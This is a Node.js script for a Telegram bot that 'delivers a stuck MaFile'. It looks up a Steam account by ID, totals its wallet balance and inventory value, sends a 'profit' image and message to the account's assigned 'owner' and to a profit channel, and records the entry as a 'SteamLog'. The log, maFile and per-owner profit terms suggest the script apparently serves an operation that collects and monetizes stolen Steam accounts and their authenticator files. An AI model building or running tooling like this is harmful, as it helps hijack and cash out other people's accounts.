/**
 * Deliver stuck MaFile without CheckValid enrich (avoids native crash path).
 * Usage: node scripts/deliver-stuck-mafile.js 822469
 */
require("dotenv").config();
const { Telegraf, Input } = require("telegraf");
const mongoose = require("mongoose");
const { env } = require("../src/config/env");
const SteamLog = require("../src/models/SteamLog");
const { getSteamAccounts } = require("../src/services/steamApiService");
const { getUserByTelegramId, getUserByPanelUsername } = require("../src/services/userService");
const { renderSteamProfitImage } = require("../src/utils/steamImageRenderer");
const { buildMafileChannelCaption } = require("../src/services/mafileStatusService");
const { telegramHtmlCaption } = require("../src/utils/emoji");
const { pe } = require("../src/utils/emoji");

function parseUsd(value) {
  if (value && typeof value === "object") {
    return parseUsd(value.usd ?? value.value ?? value.amount ?? value.total ?? value.price);
  }
  if (typeof value === "string") {
    const n = Number(value.replace(/\s+/g, "").replace(",", ".").replace(/[^0-9.-]/g, ""));
    return Number.isFinite(n) ? n : 0;
  }
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function moneyParts(account) {
  const steam = account?.steamInfo || {};
  const price = account?.inventory?.price || {};
  const balanceUsd = Math.max(0, parseUsd(steam.balanceUsd ?? steam.balance ?? 0));
  let inventoryUsd = 0;
  for (const key of ["tradable", "marketable", "total"]) {
    const v = parseUsd(price[key]);
    if (v > inventoryUsd) inventoryUsd = v;
  }
  return { balanceUsd, inventoryUsd, total: Number((balanceUsd + inventoryUsd).toFixed(2)) };
}

async function resolveOwner(account) {
  const telegramId = String(account?.owner?.telegram || "").trim();
  if (telegramId) return telegramId;
  const panelUsername = String(account?.owner?.username || "").trim();
  if (!panelUsername) return "";
  const user = await getUserByPanelUsername(panelUsername);
  return String(user?.telegramId || "");
}

async function main() {
  const sourceId = String(process.argv[2] || "").trim();
  if (!/^\d+$/.test(sourceId)) throw new Error("Usage: node scripts/deliver-stuck-mafile.js <id>");
  await mongoose.connect(process.env.MONGO_URI || process.env.MONGODB_URI);
  const bot = new Telegraf(env.botToken);

  console.log("fetch accounts");
  const payload = await getSteamAccounts(null, { offset: 0, limit: 100 });
  const account = (payload?.rows || []).find((row) => String(row.id) === sourceId);
  if (!account) throw new Error(`Account ${sourceId} not in /steam/accounts`);

  const ownerTelegramId = (await resolveOwner(account)) || "";
  const parts = moneyParts(account);
  console.log({ ownerTelegramId, ...parts, login: account.username });

  console.log("render image");
  const imageBuffer = await renderSteamProfitImage({
    items: [],
    games: Array.isArray(account.gamesInfo) ? account.gamesInfo : [],
    total: parts.total,
    balanceUsd: parts.balanceUsd,
    inventoryUsd: parts.inventoryUsd,
    mafileTime:
      account.mafileSessionAvailableAt ||
      account.maFileSessionAvailableAt ||
      account.mafileTime ||
      "",
  });
  console.log("image bytes", imageBuffer?.length || 0);
  if (!imageBuffer?.length) throw new Error("empty image");

  let dmMessageId = "";
  if (ownerTelegramId) {
    console.log("send DM", ownerTelegramId);
    try {
      const dm = await bot.telegram.sendPhoto(
        ownerTelegramId,
        Input.fromBuffer(imageBuffer, `steam-mafile-${sourceId}.png`),
        telegramHtmlCaption(
          `${pe("gift")} <b>Найден новый MaFile</b>\n<code>${account.username || sourceId}</code>\n${pe("coins")} Сумма: $${parts.total.toFixed(2)}\n└ Баланс: $${parts.balanceUsd.toFixed(2)} · Инвентарь: $${parts.inventoryUsd.toFixed(2)}`
        )
      );
      dmMessageId = String(dm.message_id || "");
    } catch (error) {
      console.warn("DM failed", error?.response?.description || error.message);
    }
  }

  let channelMessageId = "";
  if (!env.steamProfitChannelId) throw new Error("STEAM_PROFIT_CHANNEL_ID missing");
  console.log("send channel", env.steamProfitChannelId);
  const user = ownerTelegramId ? await getUserByTelegramId(ownerTelegramId) : null;
  const caption = buildMafileChannelCaption({
    ownerTelegramId,
    user,
    total: parts.total,
    balanceUsd: parts.balanceUsd,
    inventoryUsd: parts.inventoryUsd,
    status: "pending",
  });
  const sent = await bot.telegram.sendPhoto(
    env.steamProfitChannelId,
    Input.fromBuffer(imageBuffer, `steam-profit-${sourceId}.png`),
    telegramHtmlCaption(caption)
  );
  channelMessageId = String(sent.message_id || "");

  const log = await SteamLog.findOneAndUpdate(
    { sourceId },
    {
      $set: {
        status: "processed",
        logKind: "mafile",
        ownerTelegramId,
        dmMessageId,
        channelMessageId,
        totalProfit: parts.total,
        balanceUsd: parts.balanceUsd,
        inventoryUsd: parts.inventoryUsd,
        errorMessage: "",
        mafileStatus: "pending",
      },
    },
    { new: true, upsert: true }
  );

  console.log(JSON.stringify({
    sourceId: log.sourceId,
    status: log.status,
    dmMessageId,
    channelMessageId,
    totalProfit: log.totalProfit,
  }, null, 2));

  await mongoose.disconnect();
}

main().catch(async (error) => {
  console.error("FATAL", error?.response?.description || error.message || error);
  try { await mongoose.disconnect(); } catch (_) {}
  process.exit(1);
});
